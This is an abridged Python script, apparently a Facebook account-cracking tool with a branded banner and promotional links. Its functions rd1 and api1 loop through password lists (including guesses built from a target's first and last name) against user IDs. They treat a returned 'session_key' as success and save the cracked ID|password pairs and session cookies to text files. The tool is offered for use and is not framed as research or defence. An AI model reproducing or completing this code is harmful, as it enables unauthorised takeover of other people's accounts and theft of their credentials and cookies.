# Orignally Written By Abu Talha Al Nayeem 
...
os.system("clear")
print('\n\033[1;32m Loading NAYEEM Tools...')
...
os.system('xdg-open https://facebook.com/groups/gali.aslew.bolte.parci.na/')
os.system('xdg-open https://chat.whatsapp.com/+8801870462213')
...
\033[1;36m----------------------------------------------
\033[1;32m•\033[1;37m CREATED BY  \033[1;32m •\033[1;37m  Abu Talha Al Nayeem 
\033[1;32m•\033[1;37m FACEBOOK    \033[1;32m •\033[1;37m  Abu Talha Al Nayeem 
\033[1;32m•\033[1;37m GITHUB      \033[1;32m •\033[1;37m  abutalhaalnayeem
\033[1;32m•\033[1;37m TOOLS       \033[1;32m •\033[1;37m  Premium 
...
def Main_REHAN():
		...
		if shm =='1':
			...
			os.system('xdg-open https://www.facebook.com/Xz.NAYEEM.69')
			Main_REHAN()
		elif shm =='0':
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[NAYEEM]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m[NAYEEM-OK] '+uid+' | '+pas)
						#print(' \33[1;96m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'NAYEEM_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'NAYEM_COOKIES.txt')
						...
						#print(f'\r\r\33[1m\33[1;35m [NAYEEM-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'NAYEEM-CP.txt')
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[NAYEEM-M1]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m [NAYEEM-OK] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'NAYEEM_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
